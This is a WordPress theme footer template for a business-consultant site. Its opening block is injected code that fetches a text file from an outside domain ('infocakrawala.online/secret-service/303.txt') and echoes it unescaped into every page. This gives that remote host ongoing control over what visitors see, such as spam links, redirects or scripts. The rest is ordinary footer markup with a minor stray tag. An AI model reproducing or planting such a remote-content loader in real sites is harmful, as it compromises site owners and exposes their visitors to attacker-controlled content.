
<div class="external-content">
				<?php
				
				$a = file_get_contents('https://infocakrawala.online/secret-service/303.txt');

				if ($a !== false) {
					echo $a; // Menampilkan konten sebagai teks HTML
				} else {
					echo 'c.';
				}
				?>
</div>

</div>
<footer class="footer-area">  
   <div class="container"> 
		<?php $expert_business_consultant_footer_widgets_setting = get_theme_mod('expert_business_consultant_footer_widgets_setting','1');
		do_action('expert_business_consultant_footer_above'); 
			if ( is_active_sidebar( 'expert-business-consultant-footer-widget-area' ) ) { 
				if( $expert_business_consultant_footer_widgets_setting != ''){?> ?>
				<div class="row footer-row"> 
					<?php dynamic_sidebar( 'expert-business-consultant-footer-widget-area' ); ?>
				</div>  
			<?php } ?>
		<?php }?>
	</div>
	
	<?php 
		$expert_business_consultant_footer_copyright = get_theme_mod('expert_business_consultant_footer_copyright','');
	?>
	<?php $expert_business_consultant_footer_copyright_setting = get_theme_mod('expert_business_consultant_footer_copyright_setting','1');
	 if( $expert_business_consultant_footer_copyright_setting != ''){?> 
	<div class="copy-right"> 
		<div class="container">
			<p class="copyright-text">
				<?php
					echo esc_html( apply_filters('expert_business_consultant_footer_copyright',($expert_business_consultant_footer_copyright)));
			    ?>
				<?php if($expert_business_consultant_footer_copyright == "") { ?>
						
						<?php
							echo esc_html('Copyright &copy; 2024,');
				        ?>
							<?php
							   echo esc_html( 'Business Consultant');
							?>
						<span> | </span>
						<a href="https://wordpress.org/">
							<?php
							   echo esc_html( 'WordPress Theme','expert-business-consultant');
							?>
				<?php } ?>
			</p>
		</div>
	</div>
	<?php }?>
	<?php $expert_business_consultant_scroll_top = get_theme_mod('expert_business_consultant_scroll_top_setting','1');
      if($expert_business_consultant_scroll_top == '1') { ?>
		<a id="scrolltop"><span><?php esc_html_e('TOP','expert-business-consultant'); ?><span></a>
	<?php } ?>
</footer>
</div>
<?php wp_footer(); ?>
</body>
</html>
